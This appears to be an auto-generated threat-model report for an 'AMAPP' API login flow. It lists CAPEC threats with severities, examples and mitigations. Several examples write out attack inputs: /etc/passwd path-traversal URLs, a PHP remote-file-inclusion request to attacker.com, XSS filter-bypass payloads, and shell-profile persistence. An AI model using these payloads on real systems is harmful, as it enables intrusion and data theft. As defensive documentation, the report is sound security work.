<link href="docs/Stylesheet.css" rel="stylesheet"></link>

## System Description
&nbsp;

Detailed DFD for user login/authentication process.

&nbsp;




## Dataflow Diagram - Level 1 DFD

![](amapp_dfd_auth_1.png)

&nbsp;

## Dataflows
&nbsp;

Name|From|To |Data|Protocol|Port
|:----:|:----:|:---:|:----:|:--------:|:----:|
|Submit login credentials|User|AMAPP API|Login Credentials|HTTPS|-1|
|Validate credentials|AMAPP API|AMAPP DB|Login Credentials|SQL/TLS|-1|
|Return user record|AMAPP DB|AMAPP API|User Record|SQL/TLS|-1|
|Authentication JWT Token|AMAPP API|User|JWT Authentication Token|HTTPS|-1|


## Data Dictionary
&nbsp;

Name|Description|Classification
|:----:|:--------:|:----:|
|Login Credentials|User login data: username and password.|UNKNOWN|
|Validated Credentials|Validated user data after login check.|UNKNOWN|
|User Record|User's profile and account status information.|UNKNOWN|
|JWT Authentication Token|JWT token issued upon successful authentication.|UNKNOWN|


&nbsp;

## Potential Threats

&nbsp;
&nbsp;

|
<details>
  <summary>   INP03   --   Server Side Include (SSI) Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the Options Includes directive enabled. Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error. When these logs are eventually reviewed, the server parses the SSI directives and executes them.</p>
  <h6>Mitigations</h6>
  <p>Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them. All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive. Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/101.html, http://cwe.mitre.org/data/definitions/97.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/713.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP05   --   Command Line Execution through SQL Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very High</p>
  <h6>Example Instances</h6>
  <p>SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function</p>
  <h6>Mitigations</h6>
  <p>Disable MSSQL xp_cmdshell directive on the databaseProperly validate the data (syntactically and semantically) before writing it to the database. Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/108.html, http://cwe.mitre.org/data/definitions/89.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/78.html, http://cwe.mitre.org/data/definitions/114.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AA01   --   Authentication Abuse/ByPass</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/114.html, http://cwe.mitre.org/data/definitions/287.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DS01   --   Excavation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>The adversary may collect this information through a variety of methods including active querying as well as passive observation. By exploiting weaknesses in the design or configuration of the target and its communications, an adversary is able to get the target to reveal more information than intended. Information retrieved may aid the adversary in making inferences about potential weaknesses, vulnerabilities, or techniques that assist the adversary&#x27;s objectives. This information may include details regarding the configuration or capabilities of the target, clues as to the timing or nature of activities, or otherwise sensitive information. Often this sort of attack is undertaken in preparation for some other type of attack, although the collection of information by itself may in some cases be the end goal of the adversary.</p>
  <h6>Mitigations</h6>
  <p>Minimize error/response output to only what is necessary for functional use or corrective language. Remove potentially sensitive information that is not necessary for the application&#x27;s functionality.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/116.html, http://cwe.mitre.org/data/definitions/200.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE02   --   Double Encoding</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.</p>
  <h6>Mitigations</h6>
  <p>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/173.html, http://cwe.mitre.org/data/definitions/177.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC01   --   Privilege Abuse</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DO01   --   Flooding</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary tries to bring a network or service down by flooding it with large amounts of traffic.</p>
  <h6>Mitigations</h6>
  <p>Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits. Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/125.html, http://cwe.mitre.org/data/definitions/404.html, http://cwe.mitre.org/data/definitions/770.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   HA01   --   Path Traversal</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very High</p>
  <h6>Example Instances</h6>
  <p>An example of using path traversal to attack some set of resources on a web server is to use a standard HTTP request http://example/../../../../../etc/passwd From an attacker point of view, this may be sufficient to gain access to the password file on a poorly protected system. If the attacker can list directories of critical resources then read only access is not sufficient to protect the system.</p>
  <h6>Mitigations</h6>
  <p>Design: Configure the access control correctly. Design: Enforce principle of least privilege. Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution. Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host. 6. Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands. Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/126.html, http://cwe.mitre.org/data/definitions/22.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DO02   --   Excessive Allocation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.</p>
  <h6>Mitigations</h6>
  <p>Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP08   --   Format String Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks.</p>
  <h6>Mitigations</h6>
  <p>Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/135.html, http://cwe.mitre.org/data/definitions/134.html, http://cwe.mitre.org/data/definitions/133.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP09   --   LDAP Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack.</p>
  <h6>Mitigations</h6>
  <p>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/136.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/90.html, http://cwe.mitre.org/data/definitions/20.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP10   --   Parameter Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>The target application accepts a string as user input, fails to sanitize characters that have a special meaning in the parameter encoding, and inserts the user-supplied string in an encoding which is then processed.</p>
  <h6>Mitigations</h6>
  <p>Implement an audit log written to a separate host. In the event of a compromise, the audit log may be able to provide evidence and details of the compromise. Treat all user input as untrusted data that must be validated before use.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/137.html, http://cwe.mitre.org/data/definitions/88.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP11   --   Relative Path Traversal</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>The attacker uses relative path traversal to access files in the application. This is an example of accessing user&#x27;s password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker.</p>
  <h6>Mitigations</h6>
  <p>Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach. Implementation: Prefer working without user input when using file system calls. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/139.html, http://cwe.mitre.org/data/definitions/23.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP14   --   Input Data Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values.</p>
  <h6>Mitigations</h6>
  <p>Validation of user input for type, length, data-range, format, etc.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/153.html, http://cwe.mitre.org/data/definitions/20.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR03   --   Dictionary-based Password Attack</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user&#x27;s logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096</p>
  <h6>Mitigations</h6>
  <p>Create a strong password policy and ensure that your system enforces this policy.Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/16.html, http://cwe.mitre.org/data/definitions/521.html, http://cwe.mitre.org/data/definitions/262.html, http://cwe.mitre.org/data/definitions/263.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DS03   --   Footprinting</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very Low</p>
  <h6>Example Instances</h6>
  <p>In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let&#x27;s check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We&#x27;ll set the interval between packets to 1 millisecond. We&#x27;ll set the number of seconds to wait until a ping times out to 5. We&#x27;ll set the ping size to 500 bytes and we&#x27;ll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we&#x27;ll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let&#x27;s port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We&#x27;ll start searching from port number 1, and we&#x27;ll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident.</p>
  <h6>Mitigations</h6>
  <p>Keep patches up to date by installing weekly or daily if possible.Shut down unnecessary services/ports.Change default passwords by choosing strong passwords.Curtail unexpected input.Encrypt and password-protect sensitive data.Avoid including information that has the potential to identify and compromise your organization&#x27;s security such as access to business plans, formulas, and proprietary documents.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/169.html, http://cwe.mitre.org/data/definitions/200.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC06   --   Using Malicious Files</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very High</p>
  <h6>Example Instances</h6>
  <p>Consider a directory on a web server with the following permissions drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot This could allow an attacker to both execute and upload and execute programs&#x27; on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit.</p>
  <h6>Mitigations</h6>
  <p>Design: Enforce principle of least privilegeDesign: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/17.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/272.html, http://cwe.mitre.org/data/definitions/270.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   HA03   --   Web Application Fingerprinting</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Low</p>
  <h6>Example Instances</h6>
  <p>An attacker sends malformed requests or requests of nonexistent pages to the server. Consider the following HTTP responses. Response from Apache 1.3.23$ nc apache.server.com80 GET / HTTP/3.0 HTTP/1.1 400 Bad RequestDate: Sun, 15 Jun 2003 17:12: 37 GMTServer: Apache/1.3.23Connection: closeTransfer: chunkedContent-Type: text/HTML; charset=iso-8859-1 Response from IIS 5.0$ nc iis.server.com 80GET / HTTP/3.0 HTTP/1.1 200 OKServer: Microsoft-IIS/5.0Content-Location: http://iis.example.com/Default.htmDate: Fri, 01 Jan 1999 20:14: 02 GMTContent-Type: text/HTMLAccept-Ranges: bytes Last-Modified: Fri, 01 Jan 1999 20:14: 02 GMTETag: W/e0d362a4c335be1: ae1Content-Length: 133 [R.170.2]</p>
  <h6>Mitigations</h6>
  <p>Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide URL file extension.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie&#x27;s software information filed.Implementation: Appropriately deal with error messages.Implementation: Obfuscate database type in Database API&#x27;s error message.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/170.html, http://cwe.mitre.org/data/definitions/497.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   SC02   --   XSS Targeting Non-Script Elements</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very High</p>
  <h6>Example Instances</h6>
  <p>An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. A malicious user embeds JavaScript in the IMG tags in his messages that gets executed within the victim&#x27;s browser whenever the victim reads these messages. &lt;img src=javascript:alert(&#x27;XSS&#x27;)&gt; When executed within the victim&#x27;s browser, the malicious script could accomplish a number of adversary objectives including stealing sensitive information such as usernames, passwords, or cookies.</p>
  <h6>Mitigations</h6>
  <p>In addition to the traditional input fields, all other user controllable inputs, such as image tags within messages or the likes, must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/18.html, http://cwe.mitre.org/data/definitions/80.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC07   --   Exploiting Incorrectly Configured Access Control Security Levels</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application.</p>
  <h6>Mitigations</h6>
  <p>Design: Configure the access control correctly.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/180.html, http://cwe.mitre.org/data/definitions/732.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   SC03   --   Embedding Scripts within Scripts</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Ajax applications enable rich functionality for browser based web applications. Applications like Google Maps deliver unprecedented ability to zoom in and out, scroll graphics, and change graphic presentation through Ajax. The security issues that an attacker may exploit in this instance are the relative lack of security features in JavaScript and the various browser&#x27;s implementation of JavaScript, these security gaps are what XSS and a host of other client side vulnerabilities are based on. While Ajax may not open up new security holes, per se, due to the conversational aspects between client and server of Ajax communication, attacks can be optimized. A single zoom in or zoom out on a graphic in an Ajax application may round trip to the server dozens of times. One of the first steps many attackers take is frequently footprinting an environment, this can include scanning local addresses like 192.*.*.* IP addresses, checking local directories, files, and settings for known vulnerabilities, and so on. &lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt; The XSS script that is embedded in a given IMG tag can be manipulated to probe a different address on every click of the mouse or other motions that the Ajax application is aware of. In addition the enumerations allow for the attacker to nest sequential logic in the attacks. While Ajax applications do not open up brand new attack vectors, the existing attack vectors are more than adequate to execute attacks, and now these attacks can be optimized to sequentially execute and enumerate host environments.~/.bash_profile and ~/.bashrc are executed in a user&#x27;s context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.</p>
  <h6>Mitigations</h6>
  <p>Use browser technologies that do not allow client side scripting.Utilize strict type, character, and encoding enforcement.Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client&#x27;s browser has no way of discerning where the data is originating from.Ensure all content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all remote content.Perform output validation for all remote content.Disable scripting languages such as JavaScript in browserSession tokens for specific hostPatching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/19.html, http://cwe.mitre.org/data/definitions/284.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP16   --   PHP Remote File Inclusion</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>The adversary controls a PHP script on a server http://attacker.com/rfi.txt The .txt extension is given so that the script doesn&#x27;t get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET[&#x27;filename&#x27;] . &#x27;.txt&#x27;) The adversary creates an HTTP request that passes his own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the .txt prefix, the PHP runtime download the attack&#x27;s script and the content of the script gets executed in the same context as the rest of the original script.</p>
  <h6>Mitigations</h6>
  <p>Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Only allow known files to be included (whitelist)Implementation: Make use of indirect references passed in URL parameters instead of file namesConfiguration: Ensure that remote scripts cannot be include in the include or require PHP directives</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/193.html, http://cwe.mitre.org/data/definitions/98.html, http://cwe.mitre.org/data/definitions/80.html, http://cwe.mitre.org/data/definitions/714.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AA02   --   Principal Spoof</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.</p>
  <h6>Mitigations</h6>
  <p>Employ robust authentication processes (e.g., multi-factor authentication).</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/195.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DS04   --   XSS Targeting Error Pages</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>A third party web server fails to adequately sanitize messages sent in error pages. Adversary takes advantage of the data displayed in the error message.</p>
  <h6>Mitigations</h6>
  <p>Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be used in error messages.Implementation: The victim should configure the browser to minimize active content from untrusted sources.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/198.html, http://cwe.mitre.org/data/definitions/81.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   SC04   --   XSS Using Alternate Syntax</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>In this example, the attacker tries to get a script executed by the victim&#x27;s browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An attacker will then create a special payload to bypass this filter: &lt;scriscriptpt&gt;alert(1)&lt;/scscriptript&gt; when the applications gets this input string, it will replace all script (case insensitive) by the empty string and the resulting input will be the desired vector by the attacker. In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., &lt;script&gt;HERE&lt;/script&gt;). For the attacker to execute the same payload as in the previous example, he would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter ((w+)s*(.*)|alert|eval|function|document) and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string alert would be stripped. An attacker will then create a special payload to bypass this filter: this[&#x27;al&#x27; + &#x27;ert&#x27;](1) when the applications gets this input string, it won&#x27;t replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The attacker could also have used non-alphanumeric XSS vectors to bypass the filter; for example, ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!&#x27;&#x27;+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_) would be executed by the JavaScript engine like alert(1) is.</p>
  <h6>Mitigations</h6>
  <p>Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcementImplementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/199.html, http://cwe.mitre.org/data/definitions/87.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
